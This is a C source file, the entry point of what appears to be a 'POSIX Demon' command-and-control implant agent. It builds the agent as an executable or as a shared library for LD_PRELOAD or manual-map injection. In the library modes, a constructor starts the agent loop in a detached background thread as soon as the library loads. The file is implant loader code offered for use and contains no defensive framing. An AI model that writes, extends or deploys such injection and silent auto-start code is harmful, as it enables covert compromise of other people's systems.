/*
 * Main.c — Entry point for the POSIX Demon agent.
 *
 * Supports three compilation modes (controlled by preprocessor defines):
 *
 *   DEMON_EXE    (default) — standalone executable
 *   DEMON_SO     — shared library (.so / .dylib); exports demon_start()
 *                 for manual-map / LD_PRELOAD injection scenarios
 *   DEMON_THREAD — spawn the agent loop in a background thread,
 *                 return immediately (used when loaded via dlopen)
 */

#include "DemonPosix.h"
#include <stdlib.h>

/* ── Shared library export name ──────────────────────────────────────── */
#if defined(DEMON_SO) || defined(DEMON_THREAD)
__attribute__((visibility("default")))
void demon_start(void);
#endif

/* ── Background thread wrapper ───────────────────────────────────────── */
#ifdef DEMON_THREAD
#include <pthread.h>

static void *agent_thread(void *arg)
{
    (void)arg;
    RuntimeInit();
    return NULL;
}

__attribute__((constructor))
static void ctor(void)
{
    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    pthread_create(&tid, &attr, agent_thread, NULL);
    pthread_attr_destroy(&attr);
}

void demon_start(void) { ctor(); }

#elif defined(DEMON_SO)
/* ── Shared library (loaded manually) ───────────────────────────────── */
__attribute__((constructor))
static void ctor(void) { RuntimeInit(); }

void demon_start(void) { RuntimeInit(); }

#else
/* ── Standalone executable ───────────────────────────────────────────── */
int main(int argc, char *argv[])
{
    (void)argc; (void)argv;

#ifdef DEBUG
    fprintf(stderr, "[DemonPosix] starting\n");
#endif

    RuntimeInit();
    return 0;
}
#endif
